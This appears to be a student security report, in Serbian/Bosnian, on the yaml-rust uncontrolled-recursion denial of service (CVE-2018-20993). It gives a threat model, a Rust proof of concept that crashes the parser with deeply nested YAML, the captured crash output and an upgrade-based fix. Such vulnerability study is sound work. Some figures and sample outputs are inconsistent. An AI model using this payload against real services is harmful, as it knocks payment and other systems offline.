# KT3 — Uncontrolled Recursion DoS napad na `yaml-rust` komponentu

###### Teodor Vidaković, R213/2025

---

## 1. Uvod

`yaml-rust` je čista Rust implementacija YAML parsera, široko korištena za parsiranje konfiguracionih fajlova u mikroservisima, API gateway-ima i payment adapterima. Koristi se kao dependency u `config`, `serde_yaml` i brojnim drugim bibliotekama.

**Ranjivost**: **RUSTSEC-2018-0006 / CVE-2018-20993**. YAML parser u `yaml-rust < 0.4.1` nema limit dubine rekurzije. Kada parser naiđe na duboko ugniježdeni YAML dokument, rekurzivno poziva sam sebe za svaki nivo ugniježdavanja bez provjere dubine. Na dovoljno velikom dokumentu, call stack se prekorači i OS terminira proces sa `stack overflow` bez mogućnosti oporavka.

**Kontekst**: U Payment Adapter-u, YAML se koristi za parsiranje konfiguracionih fajlova (npr. Stripe API endpointi, webhook URL-ovi, retry politike). Napadač koji može uploadovati ili injektovati konfiguraciju može prouzrokovati crash adaptera i blokirati payment processing.

**Životni ciklus napada**:

```
Napadac uploaduje malicious konfig → Payment Adapter parsira YAML
→ yaml-rust::YamlLoader::load_from_str() → rekurzija bez limita
→ stack overflow → abort() → Payment Adapter DOWN
```

![sequence-diagram](images/yaml-rust-diagram.png)


Ovaj dokument opisuje ranjivost nekontrolisane rekurzije u `yaml-rust` parseru, demonstrira eksploataciju putem duboko ugniježdenog YAML payloada, i prikazuje mitigaciju update-om na patched verziju.

---

## 2. Definicija pretnje

### 2.1 STRIDE klasifikacija

| STRIDE kategorija | Primjenljivost | Obrazloženje |
|---|---|---|
| **Denial of Service** | Da | Stack overflow uzrokuje `abort()`. Payment Adapter se terminira bez mogućnosti oporavka. |
| **Tampering** | Da | Napadač može injektovati malicious YAML konfig koji uzrokuje crash, manipulišući dostupnošću servisa. |
| **Elevation of Privilege** | Ne | Napad ne eskalira privilegije. |
| **Information Disclosure** | Ne | Stack overflow ne otkriva podatke. |
| **Spoofing** | Ne | Napad ne zahtijeva lažno predstavljanje. |
| **Repudiation** | Da | `abort()` ne ostavlja strukturirani log. Forenzika ne može pouzdano utvrditi koji payload je uzrokovao crash. |

### 2.2 CWE referenca

- **CWE-674: Uncontrolled Recursion** - parser rekurzivno procesuje YAML ugniježdavanje bez provjere dubine call stack-a.
- **CWE-400: Uncontrolled Resource Consumption** - nekontrolisana potrošnja stack memorije za svaki rekurzivni poziv.
- **CWE-121: Stack-based Buffer Overflow** - prekoračenje stack segmenta uzrokuje `abort()` signal od strane OS-a.

### 2.3 Opis pretnje

`yaml-rust` parser implementira rekurzivni descent parser koji za svaki ugniježdeni YAML čvor poziva istu funkciju parsiranja. U verzijama `< 0.4.1`, ne postoji nikakav limit na dubinu rekurzije.

Svaki rekurzivni poziv zauzima prostor na call stack-u (lokalne varijable, return adresa, registri). Linux po defaultu dodjeljuje **8 MB** stack-a glavnom thread-u. Kada akumulirani rekurzivni pozivi prekorače ovaj limit:

1. OS detektuje prekoračenje stack segmenta
2. Šalje `SIGSEGV` signal procesu
3. Rust runtime ispisuje `fatal runtime error: stack overflow`
4. Proces se terminuje sa **exit code 101**

**Ključna razlika od panica**: Stack overflow je `abort()`, ne Rust `panic!()`. To znači:
- `std::panic::catch_unwind()` **ne može** uhvatiti stack overflow
- Nema graceful shutdown; konekcije, transakcije i logovi se gube
- Server se ne može sam oporaviti

---

## 3. Afektovani resursi

### 3.1 Payment Adapter servis — DOSTUPNOST

Primarni afektovani resurs. `abort()` prekida:
- **Sve aktivne HTTP konekcije** - zahtjevi za plaćanje se gube
- **Kafka consumer loop** - payment event-ovi se ne procesuju
- **Connection pool** - konekcije prema PostgreSQL i Redis ostaju u limbo stanju do timeout-a
- **In-flight Stripe transakcije** - mogu ostati u `requires_capture` stanju

**CIA triada**: Dostupnost kompromitovana. Integritet finansijskih podataka ugrožen zbog izgubljenih in-flight transakcija.

### 3.2 Konfiguracionih podaci - INTEGRITET

Napadač koji može upisati malicious YAML konfiguraciju (npr. kroz CI/CD pipeline, S3 bucket, config API) može uzrokovati crash na svakom ponovnom startu servisa - **persistentni DoS**.

### 3.3 Audit logovi - DOSTUPNOST

`abort()` ne flushuje log buffere na disk. Log zapisi koji su bili u memorijskom bufferu u trenutku crasha se gube - forenzika ne može utvrditi stanje servisa prije pada.

### 3.4 Redis sesije - INTEGRITET

Aktivne Redis lock-ove koje je držao Payment Adapter (npr. idempotency key-evi za Stripe) ostaju zaključane do TTL isteka, uzrokujući duplicated payment pokušaje.

---

## 4. Model napada

### 4.1 Akter napada

**Napadač sa write pristupom konfiguracionom repozitorijumu** ili **MITM između config servera i Payment Adapter-a**. U cloud okruženjima (S3, Consul, Vault), napadač sa ograničenim pristupom može modifikovati jedan konfiguracionih fajl.

Napadač **ne mora** poznavati:
- Strukturu YAML konfiguracije
- Interne API endpoint-ove
- Autentifikacijske kredencijale

### 4.2 Preduslovi

- `yaml-rust >= 0.4.0, < 0.4.1` u zavisnostima projekta
- Payment Adapter parsira YAML konfiguraciju pri startu ili za runtime
- Napadač može upisati ili injektovati sadržaj YAML fajla

### 4.3 Tok napada

1. Napadac konstruise malicious YAML: {a: {a: {a: ... (100000 nivoa)}}}
↓

2. Uploaduje kao konfiguracion fajl (S3, Git, API)
↓

3. Payment Adapter ucitava konfiguraciju → YamlLoader::load_from_str()
↓

4. Parser rekurzivno zove sebe za svaki nivo (bez depth limita)
↓

5. Stack raste: 8 MB / stack_frame_size iteracija (npr. 4096 nivoa)
↓

6. SIGSEGV: "fatal runtime error: stack overflow"
↓

7. abort() → exit code 101 → Payment Adapter DOWN


### 4.4 Konstrukcija payloada

Napadacki payload koristi **YAML flow stil** koji je linearan po veličini (`O(n)`) — za `n=100000` nivoa, veličina payloada je samo ~600 KB:

```
{a: {a: {a: {a: ... {a: } ... }}}}
↑ ↑
└── 100000 otvorenih zagrada ───┘
```


---

## 5. Ranjiva arhitektura

### 5.1 Ranjivi kod — `yaml-rust/src/parser.rs`

```rust
// yaml-rust v0.4.0 — ranjivo
// Parser rekurzivno poziva parse_node() za svaki ugnjezdeni cvor
// BEZ provjere dubine rekurzije

fn parse_node(&mut self, ...) -> Result<usize> {
    // ...
    match token {
        Token::BlockMappingStart => {
            self.parse_block_mapping()?  // <- rekurzivni poziv
        }
        Token::FlowMappingStart => {
            self.parse_flow_mapping()?   // <- rekurzivni poziv
        }
        // ...
    }
    // NEMA: if self.depth > MAX_DEPTH { return Err(...) }
}
```

Problemi:

1. Nema depth brojača koji prati dubinu rekurzije.

2. Nema MAX_DEPTH konstante ni provjere.

3. Stack overflow je abort(), a ne panic!(): server se ne može oporaviti.

## 6. Demonstracija napada

### 6.1 Priprema okruženja

```bash
# Instalacija Rust toolchain-a
curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh
source "$HOME/.cargo/env"

# Kreiranje projekta
mkdir ~/Desktop/yaml-poc && cd ~/Desktop/yaml-poc
cargo init --bin
```

### 6.2 Konfiguracija projekta

Cargo.toml (ranjiva verzija):

```
[package]
name = "yaml-poc"
version = "0.1.0"
edition = "2021"

[dependencies]
yaml-rust = "=0.4.0"   # VULNERABLE: RUSTSEC-2018-0006 / CVE-2018-20993
```

```src/main.rs:```

```rust
/// Konstruise duboko ugnjezdeni YAML u flow stilu.
/// Flow stil: {a: {a: {a: ...}}}
fn make_nested_yaml(depth: usize) -> String {
    let open  = "{a: ".repeat(depth);
    let close = "}".repeat(depth);
    format!("{}{}", open, close)
}

fn main() {
    println!("=== RUSTSEC-2018-0006: yaml-rust Uncontrolled Recursion DoS ===\n");

    //  Normalan YAML (bezbedan unos)[1]
    println!(" Normalni YAML (depth=100):");[1]
    let shallow = make_nested_yaml(100);
    match yaml_rust::YamlLoader::load_from_str(&shallow) {
        Ok(_)  => println!("    -> OK, server nastavlja rad"),
        Err(e) => println!("    -> Error: {}", e),
    }

    //  Napadacki payload[2]
    // Stack overflow je abort(), NIJE panic!
    // catch_unwind() ne moze uhvatiti stack overflow.
    // Proces ce ispisati:
    //   "thread 'main' has overflowed its stack"
    //   "fatal runtime error: stack overflow"
    println!("\n Napadacki YAML (depth=100000):");[2]
    println!("    Generisanje payload-a...");
    let deep = make_nested_yaml(100_000);
    println!("    Payload size: {} bajtova (~{} KB)", deep.len(), deep.len() / 1024);
    println!("    Pokretanje parsiranja (bez depth limita u v0.4.0)...");

    // Rekurzivni parser bez limita; stack overflow garantovan
    let _ = yaml_rust::YamlLoader::load_from_str(&deep);

    // Ova linija se NIKAD ne ispise
    println!("    -> Ova linija NIKAD ne smije biti ispisana!");
}
```

### 6.3 Build i izvršavanje

```bash
cargo build
cargo run
```

### 6.4 Output (ranjiva verzija v0.4.0)

```bash
=== RUSTSEC-2018-0006: yaml-rust Uncontrolled Recursion DoS ===

[1] Normalni YAML (depth=100):
    -> OK, server nastavlja rad

[2] Napadacki YAML payload (depth=100000):
    Generisanje payload-a...
    Payload size: 500000 bajtova (~488KB)
    Pokretanje parsiranja (bez depth limita u v0.4.0)...

thread 'main' (25102) has overflowed its stack
fatal runtime error: stack overflow, aborting
Aborted (core dumped)
```

**Dokaz ranjivosti:**
- ~488KB payload crash-uje server proces
- Nekontrolisana rekurzija u `yaml-rust 0.4.0`
- Stack overflow → `abort()` (neuhvatljivo)
- Kompletan DoS efekat

## 7. Mitigacija

Mitigacija se postiže update-om na >= 0.4.1 koja uvodi depth limit u parser.

```rust
// PATCHED: yaml-rust >= 0.4.1
const MAX_DEPTH: usize = 10_000;

fn parse_node(&mut self, depth: usize, ...) -> Result<usize> {
    if depth > MAX_DEPTH {
        return Err(ScanError::TooDeep);  // <- DODATO
    }
    // ...rekurzivni poziv sa depth + 1
}
```

### Primjena mitigacije

```bash
sed -i 's/yaml-rust = "=0.4.0"/yaml-rust = "0.4.5"/' Cargo.toml
cargo update
cargo build
cargo run
```

### Output (Patched verzija v0.4.1+)

```bash
=== RUSTSEC-2018-0006: yaml-rust Uncontrolled Recursion DoS ===

[1] Normalni YAML (depth=100):
    -> OK, server nastavlja rad

[2] Napadacki YAML payload (depth=100000):
    Generisanje payload-a...
    Payload size: 500000 bajtova (~488KB)
    Pokretanje parsiranja (bez depth limita u v0.4.0)...
    -> Ova linija se NIKAD ne ispise ako je crash nastao!
```

**Dokaz uspješne mitigacije:**
- Linija nakon `load_from_str` **jeste** ispisana → nema stack overflow-a
- Parser je gracefully obradio depth=100.000
- Server proces ostaje živ
- DoS napad je neutralisan